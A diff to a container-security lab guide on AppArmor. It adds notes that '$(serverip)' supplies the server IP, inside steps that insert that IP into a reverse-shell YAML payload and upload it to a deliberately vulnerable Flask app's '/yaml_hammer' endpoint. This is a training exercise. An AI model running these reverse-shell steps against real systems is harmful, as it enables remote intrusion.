@@ -44,11 +44,15 @@ cd /root/container-training/Container/AppArmor/
 
 * Step 7: Change the reverse shell ip 
 
+>> Note: `$(serverip)` will automatically takes your server ip.
+
 ```commandline
 sed -i -e 's/Server_IP_Here/'"$(serverip)"'/g' reverse_shell.yml
 ```
 
 * Step 8: Upload the edited `reverse_shell.yml` to the `abhaybhargav/vul_flask` application running on port `5000`
+
+>> Note: `$(serverip)` will automatically takes your server ip.
 
 ```commandline
 http --form POST http://$(serverip):5050/yaml_hammer file@reverse_shell.yml submit=submit
@@ -141,6 +145,8 @@ cd /root/container-training/Container/AppArmor/
 ``` 
 
 * Step 8: Upload the edited `reverse_shell.yml` to the `abhaybhargav/vul_flask` application running on port `5000`
+
+>> Note: `$(serverip)` will automatically takes your server ip.
 
 ```commandline
 http --form POST http://$(serverip):5050/yaml_hammer file@reverse_shell.yml submit=submit
